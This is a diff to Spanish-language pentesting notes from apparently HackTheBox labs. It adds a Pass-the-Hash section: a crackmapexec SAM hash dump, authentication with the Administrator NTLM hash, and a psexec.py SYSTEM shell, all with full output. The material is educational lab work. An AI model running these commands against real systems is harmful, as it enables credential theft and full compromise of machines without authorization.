@@ -85,14 +85,50 @@ Aprovechando que el puerto smb esta abierto podemo ennumerar los recursos compar
 SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
 ```
 Para listar los recursos compartidos
-
 ```java
 ┌──(root㉿kali)-[/home/…/CTF/HTB/legacy/content]
 └─# crackmapexec smb 10.10.10.4 -u 'null' -p '' --shares           
 SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
 SMB         10.10.10.4      445    LEGACY           [-] legacy\null: STATUS_LOGON_FAILURE 
 ```                                                                                          
+### Pass The Hash
 
+"Pass the Hash" (PtH) es una técnica utilizada por los atacantes en ciberseguridad para obtener acceso a sistemas y redes mediante el uso de hashes de contraseñas en lugar de la contraseña real. En lugar de adivinar o romper la contraseña de un usuario, los atacantes utilizan herramientas para extraer los hashes de las contraseñas almacenados en un sistema y luego utilizar esos hashes para autenticarse en el sistema como si tuvieran la contraseña real. Esto les permite obtener acceso a los recursos protegidos por el usuario afectado.
+```java
+┌──(root㉿kali)-[/home/s3cur1ty3c]
+└─# crackmapexec smb 10.10.10.152 -u 'usuariodos' -p 'p3nT3st!' --sam
+SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
+SMB         10.10.10.152    445    NETMON           [+] netmon\usuariodos:p3nT3st! (Pwn3d!)
+SMB         10.10.10.152    445    NETMON           [+] Dumping SAM hashes
+SMB         10.10.10.152    445    NETMON           Administrator:500:aad3b435b51404eeaad3b435b51404ee:d0f73603a4d96655430fdf02de4afaee:::
+SMB         10.10.10.152    445    NETMON           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.152    445    NETMON           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.152    445    NETMON           usuariodos:1000:aad3b435b51404eeaad3b435b51404ee:6df6a842ba1250d3fbf4ab6b3d54bcbc:::
+SMB         10.10.10.152    445    NETMON           [+] Added 4 SAM hashes to the database
+```
+Con las hashes obtenidos se puede hacer un pass the hashses, con crackmapexec.
+```java
+┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/HTB]
+└─# crackmapexec smb 10.10.10.152 -u 'Administrator' -H 'd0f73603a4d96655430fdf02de4afaee'
+SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
+SMB         10.10.10.152    445    NETMON           [+] netmon\Administrator:d0f73603a4d96655430fdf02de4afaee (Pwn3d!)
+```
+Con la herramienta `psexec.py`, se puede utilizar el hashs para iniciar una sesion mediante una shell.
 
-
-
+```java
+┌──(root㉿kali)-[/home/s3cur1ty3c/CTF/HTB]
+└─# psexec.py WORKGROUP/Administrator@10.10.10.152 -hashes :d0f73603a4d96655430fdf02de4afaee
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+[*] Requesting shares on 10.10.10.152.....
+[*] Found writable share ADMIN$
+[*] Uploading file OHhKIKGU.exe
+[*] Opening SVCManager on 10.10.10.152.....
+[*] Creating service NKHY on 10.10.10.152.....
+[*] Starting service NKHY.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+C:\Windows\system32>whoami
+nt authority\system
+C:\Windows\system32>
+```
